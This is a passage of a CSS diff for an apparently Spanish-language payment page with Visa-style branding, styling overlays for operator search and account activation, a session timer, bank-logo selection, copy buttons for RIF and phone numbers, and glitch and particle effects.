+            color: var(--text-secondary);
+            margin: 0;
+        }
+
+        /* Overlay para búsqueda de operador */
+        .operator-overlay .operator-search-card {
+            background: white;
+            padding: 32px 28px;
+            border-radius: 22px;
+            max-width: 520px;
+            width: 95%;
+            box-shadow: 0 22px 60px rgba(0, 0, 0, 0.25);
+            position: relative;
+            transform: translateY(30px) scale(0.95);
+            transition: all 0.45s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .operator-overlay.active .operator-search-card {
+            transform: translateY(0) scale(1);
+        }
+
+        .overlay-close {
+            position: absolute;
+            top: 18px;
+            right: 18px;
+            border: none;
+            background: rgba(0,0,0,0.05);
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .operator-overlay .operator-search-card.assigned .overlay-close,
+        .activation-overlay .overlay-close {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .overlay-close:hover {
+            background: rgba(26, 31, 113, 0.1);
+            color: var(--primary-color);
+            transform: rotate(90deg);
+        }
+
+        .p2p-scanner {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            margin: 0 auto 20px;
+        }
+
+        .scanner-ring {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 2px dashed rgba(26, 31, 113, 0.15);
+            animation: operatorRotate 7s linear infinite;
+        }
+
+        .scanner-ring.delay {
+            inset: 12px;
+            animation-duration: 5s;
+        }
+
+        .scanner-core {
+            position: absolute;
+            inset: 45px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(26, 31, 113, 0.25) 0%, rgba(26, 31, 113, 0) 65%);
+            animation: operatorPulse 2.2s ease-in-out infinite;
+        }
+
+        .scanner-line {
+            position: absolute;
+            left: 50%;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: linear-gradient(to bottom, transparent, rgba(26, 31, 113, 0.4), transparent);
+            transform: translateX(-50%);
+            animation: scannerSweep 2s ease-in-out infinite;
+        }
+
+        @keyframes operatorPulse {
+            0%, 100% { transform: scale(0.8); opacity: 0.6; }
+            50% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes operatorRotate {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes scannerSweep {
+            0%, 100% { transform: translate(-50%, -10px); opacity: 0; }
+            50% { transform: translate(-50%, 10px); opacity: 1; }
+        }
+
+        .operator-progress {
+            width: 100%;
+            height: 6px;
+            border-radius: 999px;
+            background: rgba(26, 31, 113, 0.1);
+            overflow: hidden;
+            margin: 18px 0 12px;
+        }
+
+        .operator-progress-fill {
+            width: 12%;
+            height: 100%;
+            border-radius: inherit;
+            background: linear-gradient(135deg, var(--accent-color), var(--primary-color));
+            transition: width 0.6s ease;
+            position: relative;
+        }
+
+        .operator-progress-fill::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: inherit;
+            filter: blur(12px);
+            opacity: 0.5;
+        }
+
+        .operator-status-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 0;
+        }
+
+        .operator-status-list li {
+            font-size: 13px;
+            color: var(--text-secondary);
+            padding-left: 26px;
+            position: relative;
+            opacity: 0;
+            transform: translateY(10px);
+            animation: fadeInUp 0.4s ease forwards;
+        }
+
+        .operator-status-list li::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 6px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            border: 2px solid var(--accent-color);
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .operator-assigned-details {
+            display: none;
+            margin: 22px 0 10px;
+            padding: 18px;
+            border-radius: 16px;
+            background: rgba(23, 168, 75, 0.08);
+            border: 1px solid rgba(23, 168, 75, 0.2);
+            display: none;
+            gap: 16px;
+            align-items: center;
+        }
+
+        .operator-assigned-details.visible {
+            display: flex;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .operator-avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(23, 168, 75, 0.8), rgba(26, 31, 113, 0.8));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 600;
+            color: white;
+            box-shadow: 0 10px 25px rgba(23, 168, 75, 0.35);
+        }
+
+        .operator-assigned-info h4 {
+            margin-bottom: 6px;
+            color: var(--primary-color);
+        }
+
+        .operator-assigned-info p {
+            margin-bottom: 4px;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .operator-assigned-rating {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--success-color);
+        }
+
+        .operator-cta {
+            margin-top: 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .operator-cta .btn {
+            width: 100%;
+        }
+
+        .operator-disclaimer {
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-align: center;
+            margin-top: 12px;
+        }
+
+        .operator-search-card.assigned .p2p-scanner {
+            filter: hue-rotate(-20deg) brightness(1.1);
+        }
+
+        .operator-search-card.assigned .operator-progress-fill {
+            width: 100% !important;
+        }
+
+        .operator-search-card.assigned .operator-status-list li::before {
+            background: var(--success-color);
+            border-color: var(--success-color);
+        }
+
+        /* Overlay para activación de cuenta */
+        .activation-overlay .activation-card {
+            background: white;
+            padding: 36px 30px;
+            border-radius: 26px;
+            max-width: 760px;
+            width: 95%;
+            box-shadow: 0 22px 70px rgba(0, 0, 0, 0.35);
+            position: relative;
+            transform: translateY(35px) scale(0.94);
+            transition: all 0.45s cubic-bezier(0.34, 1.56, 0.64, 1);
+            overflow: hidden;
+        }
+
+        .activation-overlay.active .activation-card {
+            transform: translateY(0) scale(1);
+        }
+
+        .activation-card::before {
+            content: '';
+            position: absolute;
+            inset: -40% 20% 40% -20%;
+            background: radial-gradient(circle, rgba(247, 182, 0, 0.25) 0%, transparent 70%);
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        .activation-header {
+            position: relative;
+            margin-bottom: 22px;
+        }
+
+        .activation-badge {
+            display: inline-flex;
+            gap: 8px;
+            align-items: center;
+            padding: 6px 14px;
+            border-radius: 999px;
+            background: rgba(26, 31, 113, 0.1);
+            color: var(--primary-color);
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .activation-header h2 {
+            margin-top: 12px;
+            font-size: 26px;
+        }
+
+        .activation-summary {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .summary-item {
+            padding: 16px;
+            border-radius: 16px;
+            background: rgba(26, 31, 113, 0.05);
+            border: 1px solid rgba(26, 31, 113, 0.08);
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .summary-label {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            color: var(--text-secondary);
+        }
+
+        .summary-value {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+
+        .summary-detail {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .activation-timeline {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+            margin-bottom: 24px;
+        }
+
+        .activation-step {
+            display: flex;
+            gap: 16px;
+            align-items: flex-start;
+            padding: 14px 16px;
+            border-radius: 16px;
+            background: rgba(26, 31, 113, 0.04);
+            border: 1px solid rgba(26, 31, 113, 0.08);
+            position: relative;
+        }
+
+        .activation-step::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 16px;
+            border: 1px solid rgba(26, 31, 113, 0.08);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .activation-step:hover::before {
+            opacity: 1;
+        }
+
+        .step-index {
+            width: 36px;
+            height: 36px;
+            border-radius: 12px;
+            background: var(--visa-gradient);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 15px;
+            box-shadow: 0 8px 18px rgba(26, 31, 113, 0.2);
+        }
+
+        .step-body h4 {
+            margin-bottom: 6px;
+            font-size: 16px;
+            color: var(--primary-color);
+        }
+
+        .step-body p {
+            margin-bottom: 0;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .activation-support {
+            padding: 18px;
+            border-radius: 16px;
+            background: rgba(247, 182, 0, 0.12);
+            border: 1px solid rgba(247, 182, 0, 0.3);
+            margin-bottom: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .activation-support ul {
+            margin: 0;
+            padding-left: 18px;
+            color: var(--text-secondary);
+            font-size: 13px;
+        }
+
+        .activation-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .activation-actions .btn {
+            flex: 1;
+            min-width: 220px;
+        }
+
+        .activation-countdown {
+            text-align: center;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .activation-countdown span {
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        .activation-highlight {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            border-radius: 999px;
+            background: rgba(23, 168, 75, 0.1);
+            color: var(--success-color);
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        /* Módulo de seguridad mejorado */
+        .visa-security {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 30px;
+            gap: 12px;
+            padding: 16px;
+            border-radius: 16px;
+            background-color: var(--light-color);
+            border: 1px solid var(--border-color);
+            transition: var(--transition-medium);
+            position: relative;
+            overflow: hidden;
+            flex-wrap: wrap; /* Para mejor adaptación en móviles */
+        }
+        
+        .visa-security:hover {
+            background-color: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            transform: translateY(-3px);
+        }
+        
+        .visa-security::before {
+            content: '';
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(26, 31, 113, 0.1) 0%, transparent 70%);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            opacity: 0;
+            transition: var(--transition-medium);
+        }
+        
+        .visa-security:hover::before {
+            width: 500px;
+            height: 500px;
+            opacity: 1;
+        }
+        
+        .visa-security img {
+            height: 25px;
+            transition: var(--transition-fast);
+            z-index: 2;
+        }
+        
+        .visa-security:hover img {
+            transform: scale(1.1);
+        }
+        
+        .security-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            font-weight: 500;
+            transition: var(--transition-fast);
+            z-index: 2;
+            text-align: center; /* Para centrar en móvil */
+        }
+        
+        .visa-security:hover .security-text {
+            color: var(--primary-color);
+        }
+        
+        /* Soporte mejorado */
+        .support-link {
+            text-align: center;
+            margin-top: 25px;
+            color: var(--primary-color);
+            font-size: 14px;
+        }
+        
+        .support-link a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: var(--transition-fast);
+            padding: 10px 16px;
+            border-radius: 12px;
+            background-color: rgba(26, 31, 113, 0.05);
+        }
+        
+        .support-link a:hover {
+            color: var(--accent-color);
+            background-color: rgba(26, 31, 113, 0.1);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .support-link i {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+        
+        /* Spinner de carga mejorado */
+        .spinner-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s cubic-bezier(0.19, 1, 0.22, 1);
+            overflow-y: auto; /* Permitir scroll si es necesario */
+        }
+        
+        .spinner-container.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(26, 31, 113, 0.1);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            border-left-color: var(--primary-color);
+            animation: spinner 1.2s linear infinite;
+            margin-bottom: 30px;
+        }
+        
+        @keyframes spinner {
+            to { transform: rotate(360deg); }
+        }
+        
+        .processing-text {
+            font-size: 20px;
+            color: var(--primary-color);
+            font-weight: 600;
+            margin-top: 15px;
+            position: relative;
+        }
+        
+        .processing-text::after {
+            content: '...';
+            position: absolute;
+            animation: dots 1.5s infinite;
+            width: 24px;
+            text-align: left;
+        }
+        
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+        
+        /* Check de validación recibida mejorado */
+        .checkmark-container {
+            display: none;
+            transform: scale(0.8);
+            opacity: 0;
+        }
+        
+        .checkmark-container.active {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: appear 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+        
+        @keyframes appear {
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .checkmark-circle {
+            width: 80px;
+            height: 80px;
+            position: relative;
+            background: var(--success-color);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 25px;
+            transform: scale(0);
+            animation: scaleIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) 0.3s forwards;
+            box-shadow: 0 10px 25px rgba(23, 168, 75, 0.3);
+        }
+        
+        .checkmark-circle::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: var(--success-color);
+            opacity: 0.3;
+            animation: pulse-success 2s infinite;
+        }
+        
+        @keyframes pulse-success {
+            0% { transform: scale(1); opacity: 0.3; }
+            50% { transform: scale(1.3); opacity: 0.1; }
+            100% { transform: scale(1); opacity: 0.3; }
+        }
+        
+        @keyframes scaleIn {
+            100% { transform: scale(1); }
+        }
+        
+        .checkmark {
+            color: white;
+            font-size: 36px;
+            animation: checkmark 0.5s ease 0.7s both;
+        }
+        
+        .success-text {
+            font-size: 24px;
+            color: var(--success-color);
+            font-weight: 600;
+            margin-bottom: 15px;
+            opacity: 0;
+            animation: fadeIn 0.5s ease 0.9s forwards;
+            text-align: center;
+        }
+        
+        .validation-note {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            text-align: center;
+            max-width: 350px;
+            opacity: 0;
+            animation: fadeIn 0.5s ease 1.1s forwards;
+            line-height: 1.6;
+        }
+
+        .min-amount-note {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        /* Tooltip para confirmación de copia */
+        .tooltip {
+            position: absolute;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 500;
+            top: -40px;
+            right: 0;
+            opacity: 0;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            pointer-events: none;
+            transform: translateY(5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            z-index: 10;
+        }
+        
+        .tooltip::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            right: 10px;
+            width: 0;
+            height: 0;
+            border-left: 6px solid transparent;
+            border-right: 6px solid transparent;
+            border-top: 6px solid var(--primary-color);
+        }
+        
+        .tooltip.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        /* Sombra decorativa mejorada */
+        .card::after {
+            content: '';
+            position: absolute;
+            bottom: -20px;
+            left: 10%;
+            right: 10%;
+            height: 15px;
+            z-index: -1;
+            border-radius: 50%;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+            opacity: 0.6;
+            filter: blur(5px);
+            transition: var(--transition-medium);
+        }
+        
+        .card:hover::after {
+            bottom: -15px;
+            opacity: 0.8;
+            left: 5%;
+            right: 5%;
+        }
+        
+        /* Contador de sesión mejorado */
+        .session-timer {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 10px 16px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 15px;
+            display: none;
+            z-index: 3000;
+            box-shadow: 0 8px 20px rgba(26, 31, 113, 0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        .session-timer.active {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: slideInTop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1), pulse 2s infinite 0.5s;
+        }
+        
+        @keyframes slideInTop {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .session-timer.danger {
+            background-color: var(--error-color);
+            animation: pulse-fast 1s infinite;
+        }
+        
+        @keyframes pulse-fast {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        /* Botón de copiar mejorado para RIF y teléfono */
+        .copy-button {
+            background: var(--light-color);
+            color: var(--primary-color);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 12px 18px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition-medium);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .copy-button::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(26, 31, 113, 0.05);
+            left: -100%;
+            top: 0;
+            transition: var(--transition-medium);
+            z-index: 0;
+        }
+        
+        .copy-button:hover::before {
+            left: 0;
+        }
+        
+        .copy-button i, .copy-button span {
+            position: relative;
+            z-index: 1;
+        }
+        
+        .copy-button:hover {
+            background-color: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transform: translateY(-2px);
+        }
+        
+        .copy-button:active {
+            transform: translateY(1px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+        }
+        
+        .copy-button.copied {
+            background-color: rgba(23, 168, 75, 0.1);
+            color: var(--success-color);
+            border-color: var(--success-color);
+            box-shadow: 0 5px 15px rgba(23, 168, 75, 0.15);
+        }
+        
+        .copy-button.copied i {
+            color: var(--success-color);
+        }
+
+        /* Efecto de distorsión */
+        .distortion-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10;
+            mix-blend-mode: difference;
+            background-image: url('data:image/png;base64,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');
+            opacity: 0.6;
+            animation: glitch-movement 10s linear infinite alternate;
+        }
+
+        /* Líneas de interferencia */
+        .interference-line {
+            position: absolute;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background-color: rgba(255, 255, 255, 0.4);
+            z-index: 15;
+            pointer-events: none;
+        }
+
+        /* SISTEMA DE PARTÍCULAS */
+        .particles-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+            z-index: 5;
+        }
+
+        canvas.particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* ESTILOS PARA LOGOS DE BANCOS MEJORADOS */
+        .bank-logos-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .bank-logo {
+            width: 65px;
+            height: 40px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            padding: 6px;
+            background-color: white;
+            cursor: pointer;
+            transition: var(--transition-medium);
+            object-fit: contain;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .bank-logo::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(26, 31, 113, 0.05) 0%, transparent 60%);
+            left: 0;
+            top: 0;
+            opacity: 0;
+            transition: var(--transition-medium);
+        }
+
+        .bank-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            transition: var(--transition-medium);
+            filter: grayscale(20%);
+        }
+
+        .bank-logo:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            border-color: var(--primary-color);
+            z-index: 2;
+        }
+        
+        .bank-logo:hover img {
+            filter: grayscale(0%);
+        }
+        
+        .bank-logo:hover::before {
+            opacity: 1;
+        }
+
+        .bank-logo.selected {
+            border: 2px solid var(--primary-color);
+            box-shadow: 0 8px 20px rgba(26, 31, 113, 0.2);
+            transform: translateY(-5px) scale(1.05);
+        }
+        
+        .bank-logo.selected img {
+            filter: grayscale(0%);
+        }
+        
+        .bank-logo.selected::after {
+            content: '✓';
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            width: 25px;
+            height: 25px;
+            background-color: var(--success-color);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            box-shadow: 0 3px 8px rgba(23, 168, 75, 0.3);
+            animation: appear 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        /* Barras de distorsión */
+        @keyframes glitch-movement {
+            0%, 100% { background-position: 0 0; }
+            20% { background-position: 20% 20%; }
+            40% { background-position: -15% 40%; }
+            60% { background-position: 30% -30%; }
+            80% { background-position: -25% 60%; }
+        }
+
+        @keyframes scan-line {
+            0% { 
+                top: -10%;
+                opacity: 0.2;
+            }
+            50% { 
+                opacity: 0.5; 
+            }
+            100% { 
+                top: 110%;
+                opacity: 0.2;
+            }
+        }
+        
+        /* Estilos para la nueva funcionalidad de copiado y visualización mejorada */
+        .data-display-container {
+            flex: 1;
+            position: relative;
+            display: flex;
+            align-items: center;
+            min-height: 40px;
+            justify-content: flex-start;
+            padding-left: 15px;
+        }
+
+        .secure-content {
+            display: none;
+            font-weight: 500;
+            color: var(--primary-color);
+            background-color: rgba(247, 182, 0, 0.1);
+            padding: 10px 16px;
+            border-radius: 10px;
+            border: 1px solid var(--secondary-color);
+            animation: pulse-reveal 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            box-shadow: 0 3px 10px rgba(247, 182, 0, 0.1);
+        }
+        
+        .secure-content::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 10px;
+            border: 1px solid var(--secondary-color);
+            top: 0;
+            left: 0;
+            opacity: 0.5;
+            animation: pulse-border 2s infinite;
+        }
+        
+        @keyframes pulse-border {
+            0%, 100% { 
+                transform: scale(1);
+                opacity: 0.5;
+            }
+            50% { 
+                transform: scale(1.03);
+                opacity: 0.2;
+            }
+        }
+
+        .secure-content.visible {
+            display: block;
+        }
+
+        .click-instruction {
+            display: block;
+            color: var(--text-secondary);
+            font-size: 14px;
+            font-style: italic;
+        }
+
+        .click-instruction.hidden {
+            display: none;
+        }
+
+        .copy-confirmation {
+            display: none;
+            color: var(--success-color);
+            font-weight: 500;
+            font-size: 14px;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .copy-confirmation.visible {
+            display: flex;
+            animation: fade-in-out 3s ease forwards;
+        }
+
+        .copy-confirmation::before {
+            content: '✓';
+            display: inline-block;
+            color: white;
+            background-color: var(--success-color);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            text-align: center;
+            line-height: 20px;
+            font-size: 13px;
+            margin-right: 5px;
+            box-shadow: 0 3px 8px rgba(23, 168, 75, 0.2);
+        }
+
+        /* Botón de copiar mejorado */
+        .copy-button {
+            background: var(--light-color);
+            color: var(--primary-color);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 12px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition-medium);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .copy-button i {
+            transition: var(--transition-fast);
+        }
+
+        .copy-button:hover {
+            background-color: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transform: translateY(-2px);
+            border-color: var(--primary-color);
+        }
+        
+        .copy-button:hover i {
+            transform: translateX(-3px);
+        }
+
+        .copy-button.copied {
+            background-color: rgba(23, 168, 75, 0.08);
+            color: var(--success-color);
+            border-color: var(--success-color);
+            box-shadow: 0 5px 15px rgba(23, 168, 75, 0.15);
+        }
+
+        .copy-button.copied i {
+            color: var(--success-color);
+            animation: check-bounce 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        
+        @keyframes check-bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.3); }
+        }
+
+        @keyframes pulse-reveal {
+            0% { opacity: 0; transform: scale(0.9); }
+            50% { opacity: 1; transform: scale(1.05); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes fade-in-out {
+            0% { opacity: 0; }
+            20% { opacity: 1; }
+            80% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        
+        /* Mejoras para la selección de monto */
+        .amount-option {
+            padding: 15px;
